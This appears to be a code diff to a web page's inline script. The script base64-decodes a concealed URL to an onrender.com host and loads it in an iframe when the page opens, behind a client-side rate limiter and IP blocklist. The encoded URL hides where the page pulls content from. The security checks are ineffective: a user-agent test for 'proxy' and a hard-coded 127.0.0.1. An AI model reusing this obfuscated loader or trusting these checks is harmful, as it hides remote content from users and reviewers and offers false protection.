@@ -20,14 +20,41 @@
 <body>
     <div id="hiddenLink"></div>
     <script>
+        const blockedIPs = new Set();
+        const maxRequests = 100;
+        const windowMs = 15 * 60 * 1000; // 15 minutes
+
         // Function to detect if the request is coming from a proxy
         const isProxyRequest = () => {
             const forwardedIps = window.navigator && window.navigator.userAgent;
             return forwardedIps && forwardedIps.toLowerCase().includes('proxy');
         };
 
+        // Function to fetch and load content in an iframe
+        const loadContent = () => {
+            const clientIP = '127.0.0.1'; // Simulated client IP, replace with actual IP detection logic
+
+            if (blockedIPs.has(clientIP)) {
+                document.getElementById('hiddenLink').innerHTML = "<p>Your IP is blocked. Please try again later.</p>";
+                return;
+            }
+
+            if (limiter() && !isProxyRequest()) {
+                const encryptedLink = "aHR0cHM6Ly9hdXRvYm90MC5vbnJlbmRlci5jb20v"; // Encrypted link
+                const decodedLink = atob(encryptedLink);
+                const iframe = document.createElement('iframe');
+                iframe.className = 'ugh';
+                iframe.src = decodedLink;
+                iframe.frameBorder = '0';
+                document.body.appendChild(iframe);
+            } else {
+                blockedIPs.add(clientIP);
+                document.getElementById('hiddenLink').innerHTML = "<p>Your IP is blocked. Please try again later.</p>";
+            }
+        };
+
         // Function to limit the number of requests per time window
-        const limitRequests = (maxRequests, windowMs) => {
+        const limitRequests = () => {
             let requests = [];
             setInterval(() => {
                 requests = requests.filter(reqTime => reqTime > Date.now() - windowMs);
@@ -42,23 +69,7 @@
             };
         };
 
-        const limiter = limitRequests(100, 15 * 60 * 1000); // 100 requests per 15 minutes
-
-        // Function to fetch and load content in an iframe
-        const loadContent = () => {
-            if (limiter() && !isProxyRequest()) {
-                const encryptedLink = "aHR0cHM6Ly9hdXRvYm90MC5vbnJlbmRlci5jb20v"; // Encrypted link
-                const decodedLink = atob(encryptedLink);
-                const iframe = document.createElement('iframe');
-                iframe.className = 'ugh';
-                iframe.src = decodedLink;
-                iframe.frameBorder = '0';
-                document.body.appendChild(iframe);
-            } else {
-                // Display message or take action for blocked requests
-                document.getElementById('hiddenLink').innerHTML = "<p>Your IP is blocked or you are using a proxy. Please try again later.</p>";
-            }
-        };
+        const limiter = limitRequests();
 
         // Call the loadContent function to load content
         loadContent();
